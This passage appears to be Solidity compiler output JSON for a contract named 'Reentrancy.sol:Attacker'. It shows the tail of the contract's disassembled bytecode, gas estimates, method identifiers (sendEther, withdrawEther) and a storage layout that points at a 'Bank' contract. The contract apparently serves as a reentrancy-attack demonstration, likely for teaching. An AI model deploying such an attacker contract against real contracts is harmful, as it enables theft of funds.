EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x290 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x2A4 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH2 0x2FD DUP2 PUSH2 0x372 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH2 0x30C DUP2 PUSH2 0x3AE JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH2 0x31B DUP2 PUSH2 0x3A4 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x336 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x2F4 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x351 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x303 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x36C PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x312 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x37D DUP3 PUSH2 0x384 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x3B9 DUP3 PUSH2 0x3C0 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x3CB DUP3 PUSH2 0x3D2 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x3DD DUP3 PUSH2 0x384 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xFB EXTCODEHASH PUSH11 0x5408CDD58043B8600ED712 0x25 0xEA 0xAF 0xEC 0x4F RETURNDATACOPY LT 0xDD 0xA7 0xDD 0xA9 PUSH1 0x85 SGT 0x1F PUSH9 0xA15064736F6C634300 ADDMOD SMOD STOP CALLER "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "210000",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"bank()": "2641",
						"chekcBalance()": "339",
						"owner()": "2580",
						"sendEther()": "infinite",
						"withdrawEther()": "infinite"
					}
				},
				"methodIdentifiers": {
					"bank()": "76cdb03b",
					"chekcBalance()": "300180e9",
					"owner()": "8da5cb5b",
					"sendEther()": "0e29df22",
					"withdrawEther()": "7362377b"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 66,
						"contract": "Reentrancy.sol:Attacker",
						"label": "bank",
						"offset": 0,
						"slot": "0",
						"type": "t_contract(Bank)63"
					},
					{
						"astId": 68,
						"contract": "Reentrancy.sol:Attacker",
						"label": "owner",
						"offset": 0,
						"slot": "1",
						"type": "t_address"
					}
				],
				"types": {
					"t_address": {
						"encoding": "inplace",
						"label": "address",
						"numberOfBytes": "20"
					},
					"t_contract(Bank)63": {
						"encoding": "inplace",
						"label": "contract Bank",
						"numberOfBytes": "20"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}